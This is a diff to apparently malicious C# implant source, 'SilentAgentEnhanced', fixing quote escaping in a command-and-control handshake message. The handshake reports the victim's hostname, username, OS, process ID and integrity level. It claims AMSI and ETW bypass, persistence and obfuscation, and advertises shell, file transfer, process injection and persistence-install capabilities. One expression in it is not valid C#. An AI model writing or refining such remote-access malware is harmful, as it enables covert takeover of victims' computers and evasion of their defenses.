@@ -867,22 +867,22 @@ namespace SilentAgentEnhanced
             string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
             
             string handshake = $@"{{
-                "type": "agent_handshake",
-                "session_id": "{SESSION_ID}",
-                "hostname": "{hostname}",
-                "username": "{username}",
-                "os": "{os}",
-                "arch": "{arch}",
-                "windows11": {("10.0.2" in os).ToString().ToLower()},
-                "pid": {Process.GetCurrentProcess().Id},
-                "integrity": "{GetIntegrityLevel()}",
-                "bypass_status": {{
-                    "amsi": true,
-                    "etw": true,
-                    "persistence": true,
-                    "obfuscation": true
+                ""type"": ""agent_handshake"",
+                ""session_id"": ""{SESSION_ID}"",
+                ""hostname"": ""{hostname}"",
+                ""username"": ""{username}"",
+                ""os"": ""{os}"",
+                ""arch"": ""{arch}"",
+                ""windows11"": {("10.0.2" in os).ToString().ToLower()},
+                ""pid"": {Process.GetCurrentProcess().Id},
+                ""integrity"": ""{GetIntegrityLevel()}"",
+                ""bypass_status"": {{
+                    ""amsi"": true,
+                    ""etw"": true,
+                    ""persistence"": true,
+                    ""obfuscation"": true
                 }},
-                "capabilities": ["shell", "file_transfer", "process_injection", "persistence_install"]
+                ""capabilities"": [""shell"", ""file_transfer"", ""process_injection"", ""persistence_install""]
             }}";
             
             byte[] data = Encoding.UTF8.GetBytes(handshake);
